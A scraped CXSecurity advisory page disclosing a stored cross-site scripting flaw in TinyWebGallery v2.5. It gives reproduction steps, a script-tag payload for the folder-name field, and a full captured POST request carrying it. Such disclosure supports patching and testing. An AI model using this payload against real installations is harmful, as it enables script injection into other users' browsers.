---
title: TinyWebGallery v2.5 Stored Cross-Site Scripting (XSS)
url: https://cxsecurity.com/issue/WLB-2023050036
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-14
fetch_date: 2025-10-04T11:37:03.183062
---

# TinyWebGallery v2.5 Stored Cross-Site Scripting (XSS)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **TinyWebGallery v2.5 Stored Cross-Site Scripting (XSS)** **2023.05.13**  Credit:  **[Mirabbas Ağalarov](https://cxsecurity.com/author/Mirabbas%2BA%C4%9Falarov/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

#Exploit Title: TinyWebGallery v2.5 - Stored Cross-Site Scripting (XSS)
#Application: TinyWebGallery
#Version: v2.5
#Bugs: Stored Xss
#Technology: PHP
#Vendor URL: http://www.tinywebgallery.com/
#Software Link: https://www.tinywebgallery.com/download.php?tinywebgallery=latest
#Date of found: 07-05-2023
#Author: Mirabbas Ağalarov
#Tested on: Linux
2. Technical Details & POC
========================================
steps:
1. Login to account
2. Go to http://localhost/twg25/index.php?twg\_album=3\_youtube.com&twg\_show=Q4IPe8\_Bo7c.jpg
3. Edit
4. Set folder name section as <script>alert(4)</script>
Request :
POST /twg25/i\_frames/i\_titel.php HTTP/1.1
Host: localhost
Content-Length: 264
Cache-Control: max-age=0
sec-ch-ua: "Not:A-Brand";v="99", "Chromium";v="112"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: http://localhost/twg25/i\_frames/i\_titel.php?twg\_album=3\_youtube.com&twg\_show=Q4IPe8\_Bo7c.jpg
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=qc7mfbthpf7tnf32a34p8l766k
Connection: close
twg\_album=3\_youtube.com&twg\_show=Q4IPe8\_Bo7c.jpg&twg\_foffset=&twg\_submit=true&twg\_titel\_page2=true&twg\_foldername\_mod=1&twg\_foldername=%26lt%3Bscript%26gt%3Balert%284%29%26lt%3B%2Fscript%26gt%3B&twg\_folderdesc\_mod=1&twg\_folderdesc=aaaaaaaaaaaaaaaaa&twg\_submit=Save
5. Go to http://localhost/twg25/index.php

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050036)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top